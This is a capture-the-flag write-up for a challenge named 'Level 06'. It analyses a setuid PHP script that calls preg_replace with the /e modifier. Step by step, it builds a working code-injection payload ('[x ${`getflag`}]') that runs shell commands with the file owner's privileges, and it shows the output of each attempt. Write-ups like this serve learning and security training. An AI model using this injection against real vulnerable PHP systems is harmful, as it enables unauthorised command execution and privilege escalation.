# Level 06

## Initial Context

- Two file: `level06` and `level06.php`

## Solving the Challenge

### Analizing

```bash
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

`level06` seems to be a PHP interpreter connected to `level06.php`.

```bash
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Cleaning this file, we have:

```php
<?php

function y($m)
{
    $m = preg_replace('/\./', ' x ', $m);
    $m = preg_replace('/@/', ' y', $m);
    return $m;
}

function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace('/(\[x (.*)\])/e', "y(\"\\2\")", $a);
    $a = preg_replace('/\[/', '(', $a);
    $a = preg_replace('/\]/', ')', $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;

?>
```

The exploit here resides  in the usage of the [regex's E modifier, allowing code to be executed for a string replacement](https://stackoverflow.com/a/16986549/7292958).

The regex expect to match a string like: `[x <something>]`

```
.----------------- starting the regex
|.---------------- capturing 1st group
|| .-------------- litteral string "[x "
|| |  .----------- caturing 2nd group
|| |  |   .------- litteral string "]"
|| |  |   |  .---- ending of the regex
|| |  |   |  |.--- regex modifiers: e
|| |  |   |  ||
/(\[x (.*)\])/e
```

And if match is found, it will be replaced with:

```
.------ calling `y` function
|  .--- placing 2d capture group
|  | 
y("\2")
```

An example would be:

```
[x hello]  -->  y("hello")
```

So if we manage to call custom code, we will be able to execute a Linux command with the same privileges as `flag06`.

### Exploiting

Using a simple docker running a vulnerable PHP version, we can test things:

```
docker run --rm -it php:5-cli
```

We can evaluate simple expressions:

```php
php> echo preg_replace('/(.*)/e', "\\1", "1+1");
2
```

But calling methods with a string parameter seems to fail...

```php
php > echo preg_replace('/(.*)/e', "\\1", "shell_exec('id')");
Parse error: syntax error, unexpected ''id\');' (T_ENCAPSED_AND_WHITESPACE), expecting identifier (T_STRING) in php shell code(1) : regexp code on line 1

Fatal error: preg_replace(): Failed evaluating code:
shell_exec(\'id\') in php shell code on line 1
```

```php
php> echo preg_replace('/(.*)/e', "\\1", "shell_exec(\"id\")");
Parse error: syntax error, unexpected '"', expecting identifier (T_STRING) in php shell code(1) : regexp code on line 1

Fatal error: preg_replace(): Failed evaluating code:
shell_exec(\"id\") in php shell code on line 1
```

However, `shell_exec($cmd)` can be replaced using the [backtick operator](https://www.php.net/manual/en/function.shell-exec.php#:~:text=This%20function%20is%20identical%20to%20the%20backtick%20operator.).

```php
php> echo preg_replace('/(.*)/e', "\\1", "`id`");
uid=0(root) gid=0(root) groups=0(root)
```

Perfect, now we can combine it with the required string to make a match.

```bash
$ echo '[x `id`]' | ./level06 php://stdin
`id`
```

It seems to not work since we are being put between quotes. (`y("\2")`)

We can bypass that by using [string variables](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing). That mean wrapping our payload inside a `${code}`.

```bash
$ echo '[x ${`id`}]' | ./level06 php://stdin
PHP Notice:  Undefined variable: uid=3006(flag06) gid=2006(level06) groups=3006(flag06),100(users),2006(level06)
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

We are getting an error because PHP is trying to execute the output of `id`. But we are still getting the output, so its fine.

```bash
$ echo '[x ${`getflag`}]' | ./level06 php://stdin
PHP Notice:  Undefined variable: Check flag.Here is your token : ....
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Success!